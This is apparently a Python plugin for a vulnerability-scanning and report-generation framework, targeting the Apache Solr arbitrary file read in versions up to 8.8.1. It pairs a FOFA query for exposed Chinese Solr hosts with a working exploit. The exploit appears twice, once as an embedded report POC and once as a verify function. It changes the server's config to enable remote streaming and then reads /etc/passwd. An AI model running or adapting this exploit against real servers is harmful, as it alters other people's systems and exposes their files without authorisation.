# -*- coding: UTF-8 -*-
import time

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from lib.core.poc import Base

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

report_num = 0
t = int(time.time())


class Auto(Base):
    def __init__(self, vulndir, vulnname, todayreportdir):
        ReportInfo = {}
        ReportInfo['FOFASEARCH'] = 'app="apache-Solr" && country="CN"'
        ReportInfo['TITLE'] = 'xxx网站存在敏感文件泄露'
        ReportInfo['SUBSCRIPT'] = 'Apache Solr存在任意文件读取,漏洞攻击者可以在未授权的情况下获取目标服务器敏感文件'
        ReportInfo['COMPONENT'] = 'Apache Solr <= 8.8.1任意文件读取漏洞'
        ReportInfo['REPAIR'] = '''由于官方拒绝修复该漏洞，因此请将Apache solr在内网中启动，若需要在公网中使用，需要限制访问ip '''
        # 能够写到报告里的POC
        ReportInfo['POC'] = '''
# -*- coding: utf-8 -*-
import requests

host = "http://{host}"
if host[-1] == '/':
    host = host[:-1]


def poc(host):
    url = host + '/solr/admin/cores?indexInfo=false&wt=json'
    core_data = requests.get(url, timeout=3).json()
    if core_data['status']:
        core = list(core_data['status'].keys())[0]
        jsonp_data = {"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": 'true'}}
        requests.post(url=host + "/solr/%s/config" % core, json=jsonp_data)

        result_data = requests.post(url=host + '/solr/%s/debug/dump?param=ContentStreams' % core,
                                    data={"stream.url": "file:///etc/passwd"}).json()
        if result_data['streams']:
            print(result_data['streams'][0]['stream'])
    else:
        exit("不存在此漏洞")


poc(host)'''
        super().__init__(vulndir=vulndir, todayreportdir=todayreportdir, ReportInfo=ReportInfo, vulnname=vulnname)


# _verify要写在类外，不然apply_asyn不让执行，事逼
# # print后要加end=''
# # 有漏洞要返回[target_url, 'level']，即目标url和漏洞的严重程度
def _verify(target_url):
    info = {}
    info['host'] = target_url
    info['vulnable'] = 0
    url = target_url + '/solr/admin/cores?indexInfo=false&wt=json'
    try:
        core_data = requests.get(url, timeout=3).json()
        if core_data['status']:
            core = list(core_data['status'].keys())[0]
            jsonp_data = {"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": 'true'}}
            requests.post(url=target_url + "/solr/%s/config" % core, json=jsonp_data)

            result_data = requests.post(url=target_url + '/solr/%s/debug/dump?param=ContentStreams' % core,
                                        data={"stream.url": "file:///etc/passwd"}).json()
            if result_data['streams']:
                info['LEVEL'] = '高危'
                info['vulnable'] = 1
    except:
        pass
    return info
